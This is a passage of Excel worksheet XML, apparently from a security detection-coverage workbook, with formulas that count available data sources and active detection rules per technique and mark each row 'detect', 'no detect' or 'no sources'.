      </c>
      <c r="M367" s="9" cm="1">
        <f t="array" ref="M367">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N367" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O367" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P367" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S36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67" t="s">
        <v>386</v>
      </c>
      <c r="U367" t="s">
        <v>1835</v>
      </c>
      <c r="V367" t="s">
        <v>1836</v>
      </c>
      <c r="W367" t="b">
        <v>1</v>
      </c>
      <c r="X367" t="s">
        <v>1769</v>
      </c>
    </row>
    <row r="368" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A368" t="s">
        <v>1769</v>
      </c>
      <c r="B368" t="s">
        <v>1837</v>
      </c>
      <c r="C368" t="s">
        <v>270</v>
      </c>
      <c r="D368" t="s">
        <v>646</v>
      </c>
      <c r="E368" t="s">
        <v>1422</v>
      </c>
      <c r="F368" s="9">
        <f t="shared" si="5"/>
        <v>3</v>
      </c>
      <c r="G368" s="9" cm="1">
        <f t="array" ref="G368">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H368" s="9" t="str" cm="1">
        <f t="array" ref="H368">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I368" s="9" t="str" cm="1">
        <f t="array" ref="I368">IF(SUM(IF($C368=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C368=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J368" s="9" t="str" cm="1">
        <f t="array" ref="J36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68" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M368" s="9" cm="1">
        <f t="array" ref="M368">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N368" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O368" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P368" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S36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68" t="s">
        <v>368</v>
      </c>
      <c r="U368" t="s">
        <v>1838</v>
      </c>
      <c r="W368" t="b">
        <v>1</v>
      </c>
      <c r="X368" t="s">
        <v>1769</v>
      </c>
    </row>
    <row r="369" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A369" t="s">
        <v>1769</v>
      </c>
      <c r="B369" t="s">
        <v>1839</v>
      </c>
      <c r="C369" t="s">
        <v>1840</v>
      </c>
      <c r="D369" t="s">
        <v>646</v>
      </c>
      <c r="E369" t="s">
        <v>1841</v>
      </c>
      <c r="F369" s="9">
        <f t="shared" si="5"/>
        <v>2</v>
      </c>
      <c r="G369" s="9" cm="1">
        <f t="array" ref="G369">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H369" s="9" t="str" cm="1">
        <f t="array" ref="H369">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I369" s="9" t="str" cm="1">
        <f t="array" ref="I369">IF(SUM(IF($C369=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C369=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J369" s="9" t="str" cm="1">
        <f t="array" ref="J36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69" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M369" s="9" cm="1">
        <f t="array" ref="M369">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N369" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O369" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P369" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S36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69" t="s">
        <v>416</v>
      </c>
      <c r="U369" t="s">
        <v>1842</v>
      </c>
      <c r="V369" t="s">
        <v>1843</v>
      </c>
      <c r="W369" t="b">
        <v>1</v>
      </c>
      <c r="X369" t="s">
        <v>1769</v>
      </c>
    </row>
    <row r="370" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A370" t="s">
        <v>1844</v>
      </c>
      <c r="B370" t="s">
        <v>1844</v>
      </c>
      <c r="C370" t="s">
        <v>43</v>
      </c>
      <c r="D370" t="s">
        <v>646</v>
      </c>
      <c r="E370" t="s">
        <v>1845</v>
      </c>
      <c r="F370" s="9">
        <f t="shared" si="5"/>
        <v>10</v>
      </c>
      <c r="G370" s="9" cm="1">
        <f t="array" ref="G370">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H370" s="9" cm="1">
        <f t="array" ref="H370">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>14</v>
      </c>
      <c r="I370" s="9" t="str" cm="1">
        <f t="array" ref="I370">IF(SUM(IF($C370=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C370=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J370" s="9" cm="1">
        <f t="array" ref="J37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370" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>14</v>
      </c>
      <c r="M370" s="9" cm="1">
        <f t="array" ref="M370">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>14</v>
      </c>
      <c r="N370" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O370" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P370" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S37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70" t="s">
        <v>425</v>
      </c>
      <c r="U370" t="s">
        <v>1846</v>
      </c>
      <c r="V370" t="s">
        <v>1847</v>
      </c>
      <c r="W370" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="371" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A371" t="s">
        <v>1844</v>
      </c>
      <c r="B371" t="s">
        <v>1848</v>
      </c>
      <c r="C371" t="s">
        <v>1849</v>
      </c>
      <c r="D371" t="s">
        <v>646</v>
      </c>
      <c r="E371" t="s">
        <v>1850</v>
      </c>
      <c r="F371" s="9">
        <f t="shared" si="5"/>
        <v>5</v>
      </c>
      <c r="G371" s="9" cm="1">
        <f t="array" ref="G371">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H371" s="9" t="str" cm="1">
        <f t="array" ref="H371">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I371" s="9" t="str" cm="1">
        <f t="array" ref="I371">IF(SUM(IF($C371=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C371=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J371" s="9" t="str" cm="1">
        <f t="array" ref="J37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71" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M371" s="9" cm="1">
        <f t="array" ref="M371">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N371" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O371" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P371" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S37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71" t="s">
        <v>386</v>
      </c>
      <c r="U371" t="s">
        <v>1851</v>
      </c>
      <c r="V371" t="s">
        <v>1852</v>
      </c>
      <c r="W371" t="b">
        <v>1</v>
      </c>
      <c r="X371" t="s">
        <v>1844</v>
      </c>
    </row>
    <row r="372" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A372" t="s">
        <v>1844</v>
      </c>
      <c r="B372" t="s">
        <v>1853</v>
      </c>
      <c r="C372" t="s">
        <v>1854</v>
      </c>
      <c r="D372" t="s">
        <v>646</v>
      </c>
      <c r="E372" t="s">
        <v>1855</v>
      </c>
      <c r="F372" s="9">
        <f t="shared" si="5"/>
        <v>3</v>
      </c>
      <c r="G372" s="9" cm="1">
        <f t="array" ref="G372">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H372" s="9" t="str" cm="1">
        <f t="array" ref="H372">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I372" s="9" t="str" cm="1">
        <f t="array" ref="I372">IF(SUM(IF($C372=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C372=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J372" s="9" t="str" cm="1">
        <f t="array" ref="J37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72" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M372" s="9" cm="1">
        <f t="array" ref="M372">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N372" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O372" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P372" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S37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72" t="s">
        <v>386</v>
      </c>
      <c r="U372" t="s">
        <v>1856</v>
      </c>
      <c r="V372" t="s">
        <v>1857</v>
      </c>
      <c r="W372" t="b">
        <v>1</v>
      </c>
      <c r="X372" t="s">
        <v>1844</v>
      </c>
    </row>
    <row r="373" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A373" t="s">
        <v>1844</v>
      </c>
      <c r="B373" t="s">
        <v>1858</v>
      </c>
      <c r="C373" t="s">
        <v>1859</v>
      </c>
      <c r="D373" t="s">
        <v>646</v>
      </c>
      <c r="E373" t="s">
        <v>1802</v>
      </c>
      <c r="F373" s="9">
        <f t="shared" si="5"/>
        <v>4</v>
      </c>
      <c r="G373" s="9" cm="1">
        <f t="array" ref="G373">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H373" s="9" t="str" cm="1">
        <f t="array" ref="H373">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I373" s="9" t="str" cm="1">
        <f t="array" ref="I373">IF(SUM(IF($C373=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C373=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J373" s="9" t="str" cm="1">
        <f t="array" ref="J37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73" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M373" s="9" cm="1">
        <f t="array" ref="M373">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N373" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O373" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P373" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S37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73" t="s">
        <v>386</v>
      </c>
      <c r="U373" t="s">
        <v>1860</v>
      </c>
      <c r="V373" t="s">
        <v>1861</v>
      </c>
      <c r="W373" t="b">
        <v>1</v>
      </c>
      <c r="X373" t="s">
        <v>1844</v>
      </c>
    </row>
    <row r="374" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A374" t="s">
        <v>1844</v>
      </c>
      <c r="B374" t="s">
        <v>1862</v>
      </c>
      <c r="C374" t="s">
        <v>1863</v>
      </c>
      <c r="D374" t="s">
        <v>646</v>
      </c>
      <c r="E374" t="s">
        <v>1802</v>
      </c>
      <c r="F374" s="9">
        <f t="shared" si="5"/>
        <v>4</v>
      </c>
      <c r="G374" s="9" cm="1">
        <f t="array" ref="G374">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H374" s="9" t="str" cm="1">
        <f t="array" ref="H374">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I374" s="9" t="str" cm="1">
        <f t="array" ref="I374">IF(SUM(IF($C374=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C374=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J374" s="9" t="str" cm="1">
        <f t="array" ref="J37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74" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M374" s="9" cm="1">
        <f t="array" ref="M374">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N374" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O374" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P374" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S37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74" t="s">
        <v>386</v>
      </c>
      <c r="U374" t="s">
        <v>1864</v>
      </c>
      <c r="V374" t="s">
        <v>1865</v>
      </c>
      <c r="W374" t="b">
        <v>1</v>
      </c>
      <c r="X374" t="s">
        <v>1844</v>
      </c>
    </row>
    <row r="375" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A375" t="s">
        <v>1844</v>
      </c>
      <c r="B375" t="s">
        <v>1866</v>
      </c>
      <c r="C375" t="s">
        <v>1867</v>
      </c>
      <c r="D375" t="s">
        <v>646</v>
      </c>
      <c r="E375" t="s">
        <v>1855</v>
      </c>
      <c r="F375" s="9">
        <f t="shared" si="5"/>
        <v>3</v>
      </c>
      <c r="G375" s="9" cm="1">
        <f t="array" ref="G375">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H375" s="9" t="str" cm="1">
        <f t="array" ref="H375">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I375" s="9" t="str" cm="1">
        <f t="array" ref="I375">IF(SUM(IF($C375=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C375=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J375" s="9" t="str" cm="1">
        <f t="array" ref="J37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75" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M375" s="9" cm="1">
        <f t="array" ref="M375">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N375" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O375" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P375" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S37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75" t="s">
        <v>386</v>
      </c>
      <c r="U375" t="s">
        <v>1868</v>
      </c>
      <c r="V375" t="s">
        <v>1869</v>
      </c>
      <c r="W375" t="b">
        <v>1</v>
      </c>
      <c r="X375" t="s">
        <v>1844</v>
      </c>
    </row>
    <row r="376" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A376" t="s">
        <v>1844</v>
      </c>
      <c r="B376" t="s">
        <v>1870</v>
      </c>
      <c r="C376" t="s">
        <v>1871</v>
      </c>
      <c r="D376" t="s">
        <v>646</v>
      </c>
      <c r="E376" t="s">
        <v>1872</v>
      </c>
      <c r="F376" s="9">
        <f t="shared" si="5"/>
        <v>5</v>
      </c>
      <c r="G376" s="9" cm="1">
        <f t="array" ref="G376">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H376" s="9" t="str" cm="1">
        <f t="array" ref="H376">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I376" s="9" t="str" cm="1">
        <f t="array" ref="I376">IF(SUM(IF($C376=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C376=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J376" s="9" t="str" cm="1">
        <f t="array" ref="J37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76" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M376" s="9" cm="1">
        <f t="array" ref="M376">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N376" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O376" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P376" s="14" t="str">
